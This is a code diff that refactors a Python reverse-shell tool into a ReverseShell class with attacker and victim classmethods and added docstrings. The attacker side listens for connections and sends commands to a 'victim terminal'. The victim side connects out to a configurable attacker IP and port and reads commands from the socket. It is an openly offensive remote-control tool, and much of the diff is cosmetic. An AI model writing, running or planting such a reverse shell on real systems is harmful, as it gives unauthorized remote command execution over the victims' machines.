@@ -3,8 +3,24 @@ import sys
 import subprocess
 import os
 
-class reverse_shell:
-    def attacker(PORT):
+class ReverseShell:
+    r"""A class that implements Reverse Shell function
+    -----------
+    Classmethods :
+    - attacker | Set attacker side
+    - victim | Set victim side
+    """
+
+    @classmethod
+    def attacker(self, PORT:int):
+        r"""
+        Attacker side
+        ---
+        Paramaters :
+        - IP: `127.0.0.1/localhost` | Cannot change
+        - PORT: `int` | Set your PORT so that the victim can connect to you
+        """
+
         IP = "127.0.0.1"
         def send_commands(s, conn):
             print("victim terminal > ", end="")
@@ -47,9 +63,16 @@ class reverse_shell:
             
         attack((IP, PORT))
 
-    
-    
-    def victim(IP, PORT):
+    @classmethod
+    def victim(self, IP, PORT):
+        r"""
+        Victim side
+        ---
+        Paramaters :
+        - IP: `str` | Set attacker network IP
+        - PORT: `int` | Set attacker PORT
+        """
+
         def receiver(s):
             while True:
                 cmd_bytes = s.recv(4096)
